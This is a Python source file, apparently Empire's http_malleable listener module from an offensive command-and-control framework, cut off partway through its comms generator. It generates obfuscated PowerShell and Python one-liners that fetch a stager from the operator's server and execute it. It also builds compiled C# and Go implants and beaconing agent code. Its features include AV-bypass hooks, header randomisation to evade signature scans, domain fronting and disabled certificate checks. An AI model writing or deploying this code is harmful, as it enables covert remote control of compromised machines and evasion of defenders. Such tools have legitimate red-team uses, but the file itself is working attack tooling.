import base64
import copy
import fnmatch
import ipaddress
import logging
import os
import secrets
import ssl
import time
import urllib.parse
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from flask import Flask, Response, make_response, request
from sqlalchemy import select
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, malleable, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.common.encryption import AESCipher
from empire.server.core.config import config_manager
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import (
    ListenerValidationException,
    ModuleExecutionException,
)
from empire.server.utils import cert_util, data_util, listener_util, log_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)

# Separates header entries patched into the PowerShell stager's $customHeaders;
# http_malleable.ps1.j2 splits on the same literal. A comma would tear apart a
# User-Agent such as "(KHTML, like Gecko)".
STAGER_HEADER_SEPARATOR = "<HEND>"


class Listener:
    def __init__(self, mainMenu: MainMenu):
        # required:
        self.mainMenu = mainMenu
        self.thread = None

    def post_init(self):
        self.options["Host"]["Value"] = f"http://{helpers.lhost()}"

        # optional/specific for this module
        self.host_address = None
        self.app = None

        # randomize the length of the default_response and index_page headers to evade signature based scans
        self.header_offset = secrets.randbelow(65)

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.template_dir = self.mainMenu.install_path / "data/listeners/templates"

        self.instance_log = log

        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.agent_private_cert_key = (
            self.agent_private_cert_key_object.private_bytes_raw()
        )
        self.agent_public_cert_key = encryption.publickey_unsafe(
            self.agent_private_cert_key
        )
        self.server_private_cert_key = (
            self.server_private_cert_key_object.private_bytes_raw()
        )
        self.server_public_cert_key = encryption.publickey_unsafe(
            self.server_private_cert_key
        )

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        return (self.template_dir / "default.html").read_text(encoding="utf-8")

    def validate_options(self) -> None:
        """
        Validate all options for this listener.
        """

        profile_name = self.options["Profile"]["Value"]
        profile_data = (
            SessionLocal()
            .scalars(select(models.Profile).where(models.Profile.name == profile_name))
            .first()
        )

        if not profile_data:
            raise ListenerValidationException(
                f"Malleable profile not found: {profile_name}"
            )

        try:
            profile = malleable.Profile()
            profile.ingest(content=profile_data.data)

            # since stager negotiation comms are hard-coded, we can't use any stager transforms - overwriting with defaults
            profile.stager.client.verb = "GET"
            profile.stager.client.metadata.transforms = []
            profile.stager.client.metadata.base64url()

            # check if cookie is set for stager, else generate random cookie
            if self.options["Cookie"]["Value"] == "":
                profile.stager.client.metadata.prepend("session=")
            else:
                profile.stager.client.metadata.prepend(
                    self.options["Cookie"]["Value"] + "="
                )

            profile.stager.client.metadata.header("Cookie")
            profile.stager.server.output.transforms = []
            profile.stager.server.output.print_()

            self.host_address, err = (
                self.mainMenu.listenersv2.validate_listener_address(self.options)
            )
            if err:
                raise ListenerValidationException(err)

            if profile.validate():
                # store serialized profile for use across sessions
                self.serialized_profile = profile._serialize()

                # for agent compatibility (use post for staging)
                self.options["DefaultProfile"] = {
                    "Description": "Default communication profile for the agent.",
                    "Required": False,
                    "Value": profile.post.client.stringify(),
                }

                # grab sleeptime from profile
                self.options["DefaultDelay"] = {
                    "Description": "Agent delay/reach back interval (in seconds).",
                    "Required": False,
                    "Value": (
                        int(int(profile.sleeptime) / 1000)
                        if hasattr(profile, "sleeptime")
                        else 5
                    ),
                }

                # grab jitter from profile
                self.options["DefaultJitter"] = {
                    "Description": "Jitter in agent reachback interval (0.0-1.0).",
                    "Required": True,
                    "Value": (
                        float(profile.jitter) / 100
                        if hasattr(profile, "jitter")
                        else 0.0
                    ),
                }

                # eliminate troublesome headers
                for header in ["Connection"]:
                    profile.stager.client.headers.pop(header, None)
                    profile.get.client.headers.pop(header, None)
                    profile.post.client.headers.pop(header, None)

            else:
                raise ListenerValidationException(
                    f"Unable to parse malleable profile: {profile_name}"
                )

        except malleable.MalleableError as e:
            raise ListenerValidationException(
                f"Error parsing malleable profile: {profile_name}, {e}"
            ) from e

    def serialize_profile_for_agent(self, profile=None):
        """Return the base64-encoded JSON malleable profile consumed by
        runtime interpreters in Sharpire (C#) and Gopire (Go). Accepts an
        optional pre-deserialized Profile to avoid a redundant deserialize
        when the caller already has one.
        """
        if profile is None:
            profile = malleable.Profile._deserialize(self.serialized_profile)
        return base64.b64encode(profile.serialize_for_agent().encode("utf-8")).decode(
            "utf-8"
        )

    def stager_url(self) -> str:
        """URL the C#/Go launcher one-liner should hit for stage 0.

        Pulls from profile.stager.client.uris so stage 0 reaches the
        listener's stager dispatch (which returns the SharpireMalleable /
        Gopire binary), not the post URI that DefaultProfile happens to
        carry. Joined with host_address so the result is a complete URL
        ready to embed in the launcher.

        Raises RuntimeError when host_address is not yet set — silently
        returning a string like "None/init/" would embed an
        "http://None/..." download URL into the launcher template and
        fail silently on target.
        """
        host_address = self._require_host_address("stager_url")
        profile = malleable.Profile._deserialize(self.serialized_profile)
        uris = profile.stager.client.uris or ["/"]
        uri = secrets.choice(uris)
        return f"{host_address}{uri.lstrip('/')}"

    def _require_host_address(self, caller: str) -> str:
        """host_address, or a clear error when the listener has not started."""
        if self.host_address is None:
            raise RuntimeError(
                f"{caller}() called before host_address is set on listener "
                f"{self.options['Name']['Value']!r}; listener may not be started"
            )
        return self.host_address

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        language=None,
        listener_name=None,
        stager=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            log.error("listeners/template generate_launcher(): no language specified!")
            return None

        active_listener = self
        # extract the set options for this instantiated listener
        listenerOptions = active_listener.options

        launcher = listenerOptions["Launcher"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        host_address = self._require_host_address("generate_launcher")

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.stager.client.path = profile.stager.client.random_uri()

        if user_agent and user_agent.lower() != "default":
            if (
                user_agent.lower() == "none"
                and "User-Agent" in profile.stager.client.headers
            ):
                profile.stager.client.headers.pop("User-Agent")
            else:
                profile.stager.client.headers["User-Agent"] = user_agent

        if language == "powershell":
            launcherBase = '$ErrorActionPreference = "SilentlyContinue";'

            for bypass in bypasses:
                launcherBase += bypass

            # ==== DEFINE BYTE ARRAY CONVERSION ====
            launcherBase += (
                f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
            )

            # ==== BUILD AND STORE METADATA ====
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            routingPacketTransformed = profile.stager.client.metadata.transform(
                routingPacket
            )
            profile.stager.client.store(
                routingPacketTransformed, profile.stager.client.metadata.terminator
            )

            # ==== BUILD REQUEST ====
            launcherBase += "$wc=New-Object System.Net.WebClient;"
            launcherBase += (
                "$ser="
                + helpers.obfuscate_call_home_address(host_address.rstrip("/"))
                + ";$t='"
                + profile.stager.client.request_target
                + "';"
            )

            # ==== HANDLE SSL ====
            if host_address.startswith("https"):
                # allow for self-signed certificates for https connections
                launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            # ==== CONFIGURE PROXY ====
            if proxy and proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += (
                        "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                    )

                else:
                    launcherBase += (
                        f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                    )
                    launcherBase += "$wc.Proxy = $proxy;"

                if proxy_creds and proxy_creds.lower() != "none":
                    if proxy_creds.lower() == "default":
                        launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        if len(username.split("\\")) > 1:
                            usr = username.split("\\")[1]
                            domain = username.split("\\")[0]
                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"

                        else:
                            usr = username.split("\\")[0]
                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"

                        launcherBase += "$wc.Proxy.Credentials = $netcred;"

                # save the proxy settings to use during the entire staging process and the agent
                launcherBase += "$Script:Proxy = $wc.Proxy;"

            # ==== ADD HEADERS ====
            for header, value in profile.stager.client.headers.items():
                # If host header defined, assume domain fronting is in use and add a call to the base URL first
                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                if header.lower() == "host":
                    launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"

                launcherBase += f'$wc.Headers.Add("{header}","{value}");'

            # ==== SEND REQUEST ====
            if (
                profile.stager.client.verb.lower() != "get"
                or profile.stager.client.body
            ):
                launcherBase += f"$data=$wc.UploadData($ser+$t,'{profile.stager.client.verb}','{profile.stager.client.body}');"

            else:
                launcherBase += "$data=$wc.DownloadData($ser+$t);"

            # ==== INTERPRET RESPONSE ====
            if (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                launcherBase += (
                    "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                )
                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{profile.stager.server.output.terminator.arg}')"
                launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
                launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
            elif (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                launcherBase += ""
            else:
                launcherBase += ""
            launcherBase += profile.stager.server.output.generate_powershell_r("$data")

            # ==== DECRYPT AND EXECUTE STAGER ====
            launcherBase += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.obfuscate(
                    launcherBase,
                    obfuscation_command=obfuscation_command,
                )

            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(launcherBase, launcher)
            return launcherBase

        if language in ["python", "ironpython"]:
            # ==== HANDLE IMPORTS ====
            launcherBase = "import sys,base64\n"
            launcherBase += "import urllib.request,urllib.parse\n"

            # ==== HANDLE SSL ====
            if host_address.startswith("https"):
                launcherBase += "import ssl\n"
                launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"

            for bypass in bypasses:
                launcherBase += bypass

            launcherBase += f"server='{host_address}'\n"

            # ==== CONFIGURE PROXY ====
            if proxy and proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler()\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'})\n"
                    )
                if proxy_creds and proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "')\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy)\n"
            else:
                launcherBase += "o = urllib.request.build_opener()\n"
            # install proxy and creds globaly, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o)\n"

            # ==== BUILD AND STORE METADATA ====
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            routingPacketTransformed = profile.stager.client.metadata.transform(
                routingPacket
            )
            profile.stager.client.store(
                routingPacketTransformed, profile.stager.client.metadata.terminator
            )

            # ==== BUILD REQUEST ====
            launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
            # server ends in "/"; a leading slash here would request "//init/",
            # which Werkzeug answers with a 308 that older urllib does not follow.
            target = profile.stager.client.request_target.lstrip("/")
            launcherBase += (
                f"req=vreq(server+'{target}', {profile.stager.client.body})\n"
            )
            launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.stager.client.headers.items():
                launcherBase += f"req.add_header('{header}','{value}')\n"

            # ==== SEND REQUEST ====
            launcherBase += "res=urllib.request.urlopen(req)\n"

            # ==== INTERPRET RESPONSE ====
            if (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                launcherBase += "head=res.info().dict\n"
                launcherBase += f"a=head['{profile.stager.server.output.terminator.arg}'] if '{profile.stager.server.output.terminator.arg}' in head else ''\n"
                launcherBase += "data=urllib.parse.unquote(a)\n"
            elif (
                profile.stager.server.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                launcherBase += "data=res.read()\n"
            else:
                launcherBase += "data=''\n"
            launcherBase += profile.stager.server.output.generate_python_r("a")

            # download the stager and extract the IV
            launcherBase += "data=urllib.request.urlopen(req).read();\n"
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                if isinstance(launchEncoded, bytes):
                    launchEncoded = launchEncoded.decode("UTF-8")
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        if language == "csharp":
            workingHours = self.options["WorkingHours"]["Value"]
            killDate = self.options["KillDate"]["Value"]
            delay = self.options["DefaultDelay"]["Value"]
            jitter = self.options["DefaultJitter"]["Value"]
            lostLimit = self.options["DefaultLostLimit"]["Value"]

            # legacy Sharpire profile string (uris|ua|headers) — matches
            # what generate_agent() passes for the powershell/python paths
            profileStr = profile.post.client.stringify()
            malleableProfileB64 = self.serialize_profile_for_agent(profile=profile)

            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            raw_key_bytes = (
                self.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            # SharpireMalleable.yaml pulls in TWO source libraries (Sharpire
            # base + SharpireMalleable extension) so EmpireCompiler globs both
            # directories' .cs files into one compilation unit. The malleable
            # types/interpreter only end up in binaries generated from this
            # listener — plain http Sharpire stagers skip the extension entirely.
            stager_yaml = (
                self.mainMenu.install_path / "stagers/SharpireMalleable.yaml"
            ).read_text(encoding="utf-8")
            stager_yaml = (
                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                .replace("{{ REPLACE_STAGINGKEY }}", stagingKey)
                .replace("{{ REPLACE_PROFILE }}", profileStr)
                .replace("{{ REPLACE_MALLEABLE_PROFILE }}", malleableProfileB64)
                .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                .replace("{{ REPLACE_KILLDATE }}", killDate)
                .replace("{{ REPLACE_DELAY }}", str(delay))
                .replace("{{ REPLACE_JITTER }}", str(jitter))
                .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                .replace(
                    "{{ REPLACE_DEFAULTRESPONSE }}",
                    base64.b64encode(self.default_response().encode("UTF-8")).decode(
                        "UTF-8"
                    ),
                )
                .replace("{{ agent_private_cert_key }}", private_key_array)
                .replace("{{ agent_public_cert_key }}", public_key_array)
            )

            return str(
                self.mainMenu.dotnet_compiler.compile_stager(
                    stager_yaml, "SharpireMalleable", confuse=obfuscate
                )
            )

        if language == "go":
            return str(
                self.mainMenu.stagergenv2.generate_go_stageless(
                    self.options, listener_name=listener_name
                )
            )

        log.error(
            "listeners/http_malleable generate_launcher(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            log.error(
                "listeners/http_malleable generate_stager(): no language specified!"
            )
            return None

        # extract the set options for this instantiated listener
        port = listenerOptions["Port"]["Value"]
        host = listenerOptions["Host"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.stager.client.host = host
        profile.stager.client.port = port

        profileStr = profile.stager.client.stringify()

        # select some random URIs for staging
        stage1 = profile.stager.client.random_uri()
        stage2 = profile.stager.client.random_uri()

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http_malleable/http_malleable.ps1.j2")

            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            raw_key_bytes = (
                self.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            raw_key_bytes = (
                self.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "session_cookie": "",
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
                "agent_private_cert_key": private_key_array,
                "server_public_cert_key": server_public_key_array,
                "agent_public_cert_key": public_key_array,
            }
            stager = template.render(template_options)

            # patch in custom headers
            if profile.stager.client.headers:
                headers = STAGER_HEADER_SEPARATOR.join(
                    [
                        ":".join([k.replace(":", "%3A"), v.replace(":", "%3A")])
                        for k, v in profile.stager.client.headers.items()
                    ]
                )
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            comms_code = self.generate_comms(
                listenerOptions=listenerOptions, language=language
            )

            # stager = helpers.strip_powershell_comments(comms_code + stager)
            stager = comms_code + stager

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() == "python":
            comms_code = self.generate_comms(
                listenerOptions=listenerOptions, language=language
            )

            template_path = [
                self.mainMenu.install_path / "listeners",
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http_malleable/http_malleable.py.j2")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "agent_private_cert_key": self.agent_private_cert_key,
                "server_public_cert_key": self.server_public_cert_key,
                "agent_public_cert_key": self.agent_public_cert_key,
                "profile": profileStr,
                "session_cookie": "",
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
            }

            stager = template.render(template_options)
            stager = stager.replace("REPLACE_COMMS", comms_code)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)

            if encode:
                return base64.b64encode(stager)

            return stager

        if language.lower() in ("csharp", "go"):
            # Wrapper stagers (dll, wmic, hta, …) embed a launcher one-liner
            # that hits this URI and expects binary bytes back; mirror
            # http.py:866-880. Raise loudly on missing binary so we never
            # silently serve zero bytes (which would Assembly.Load to an
            # opaque .NET error on target with no server-side signal).
            binary_path = self.generate_launcher(
                language=language.lower(),
                listener_name=self.options["Name"]["Value"],
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
                encode=False,
            )
            if not binary_path:
                msg = (
                    f"http_malleable generate_stager: generate_launcher returned no "
                    f"binary for language={language!r} on listener "
                    f"{self.options['Name']['Value']!r}; stage 0 cannot be served."
                )
                self.instance_log.error(msg)
                log.error(msg)
                raise ModuleExecutionException(msg)
            return listener_util.read_stager_artifact(binary_path)

        log.error(
            "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with the listener.
        """

        if not language:
            log.error(
                "listeners/http_malleable generate_agent(): no language specified!"
            )
            return None

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        listenerOptions["KillDate"]["Value"]
        listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(
            self.default_response().encode("UTF-8")
        ).decode("UTF-8")

        profileStr = profile.stager.client.stringify()

        if language == "powershell":
            # read in agent code
            code = (self.mainMenu.install_path / "data/agent/agent.ps1").read_text(
                encoding="utf-8"
            )

            # strip out the comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profileStr) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                f'$DefaultResponse = "{b64DefaultResponse}"',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )

            return code

        if language == "python":
            # read in the agent base
            agent_path = (
                self.mainMenu.install_path / "data/agent/ironpython_agent.py"
                if version == "ironpython"
                else self.mainMenu.install_path / "data/agent/agent.py"
            )
            code = agent_path.read_text(encoding="utf-8")

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay=60", f"delay={delay}")
            code = code.replace("jitter=0.0", f"jitter={jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profileStr}"',
            )
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)

            return code

        if language in ("csharp", "go"):
            # csharp (Sharpire) and go (Gopire) are stageless — the agent code
            # is baked into the compiled launcher binary.
            return ""

        log.error(
            "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.
        """

        # extract the set options for this instantiated listener
        host = listenerOptions["Host"]["Value"]
        port = listenerOptions["Port"]["Value"]

        # build profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.get.client.host = host
        profile.get.client.port = port
        profile.post.client.host = host
        profile.post.client.port = port

        if not language:
            log.error("listeners/template generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            # PowerShell
            updateServers = f'$Script:ControlServers = @("{self.host_address}");'
            updateServers += "$Script:ServerIndex = 0;"

            # ==== HANDLE SSL ====
            if host.startswith("https"):
                updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            getTask = f"""
# ==== DEFINE GET ====
$script:GetTask = {{
try {{
    if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
        # ==== BUILD ROUTING PACKET ====
        $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;

        {profile.get.client.metadata.generate_powershell("$RoutingPacket")}

        # ==== BUILD REQUEST ====
        $vWc = New-Object System.Net.WebClient;
        $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        if ($Script:Proxy) {{
            $vWc.Proxy = $Script:Proxy;
        }}
"""

            # ==== CHOOSE URI ====
            getTask += (
                "$taskURI = "
                + ",".join([f"'{u}'" for u in (profile.get.client.uris or ["/"])])
                + " | Get-Random;"
            )

            # ==== ADD PARAMETERS ====
            first = True
            for parameter, value in profile.get.client.parameters.items():
                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                getTask += f"$taskURI += '{parameter}={value}';"
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                getTask += f"$taskURI += '{profile.get.client.metadata.terminator.arg}=' + $RoutingPacket;"

            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                getTask += "$taskURI += $RoutingPacket;"

            # ==== ADD HEADERS ====
            for header, value in profile.get.client.headers.items():
                getTask += f"$vWc.Headers.Add('{header}', '{value}');"
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.HEADER
            ):
                getTask += f"$vWc.Headers.Add('{profile.get.client.metadata.terminator.arg}', $RoutingPacket);"

            # ==== ADD BODY ====
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                getTask += "$body = $RoutingPacket;"
            else:
                getTask += f"$body = '{profile.get.client.body}';"

            # ==== SEND REQUEST ====
            if (
                profile.get.client.verb.lower() != "get"
                or profile.get.client.body
                or profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.get.client.verb}', [System.Text.Encoding]::Default.GetBytes('{profile.get.client.body}'));"
            else:
                getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

            # ==== EXTRACT RESULTS ====
            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                getTask += f"$data = $vWc.responseHeaders.get('{profile.get.server.output.terminator.arg}');"
                getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"

            elif (
                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
            ):
                getTask += "$data = $result;"
                getTask += "$data = [System.Text.Encoding]::Default.GetString($data);"

            getTask += f"""
# ==== INTERPRET RESULTS ====
{profile.get.server.output.generate_powershell_r("$data")}

# ==== RETURN RESULTS ====
$data = [System.Text.Encoding]::Default.GetBytes($data);
$data;
}}

# ==== HANDLE ERROR ====
}} catch [Net.WebException] {{
$script:MissedCheckins += 1;
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
}}
}}
}};
"""

            # ==== Send Message ====
            sendMessage = f"""
# ==== DEFINE POST ====
$script:SendMessage = {{
param($Packets);
if ($Packets) {{

# ==== BUILD ROUTING PACKET ====
$EncBytes = Aes-EncryptThenHmac -Key $Script:SessionKey -Plain $Packets

$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

{profile.post.client.output.generate_powershell("$RoutingPacket")}

# ==== BUILD REQUEST ====
if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
$vWc = New-Object System.Net.WebClient;

# ==== CONFIGURE PROXY ====
$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
if ($Script:Proxy) {{
$vWc.Proxy = $Script:Proxy;
}}
"""

            # ==== CHOOSE URI ====
            sendMessage += (
                "$taskURI = "
                + ",".join([f"'{u}'" for u in (profile.post.client.uris or ["/"])])
                + " | Get-Random;"
            )

            # ==== ADD PARAMETERS ====
            first = True
            for parameter, value in profile.post.client.parameters.items():
                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                sendMessage += f"$taskURI += '{parameter}={value}';"
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                first = False
                sendMessage += f"$taskURI += '{profile.post.client.output.terminator.arg}=' + $RoutingPacket;"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "$taskURI += $RoutingPacket;"

            # ==== ADD HEADERS ====
            for header, value in profile.post.client.headers.items():
                sendMessage += f"$vWc.Headers.Add('{header}', '{value}');"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.HEADER
            ):
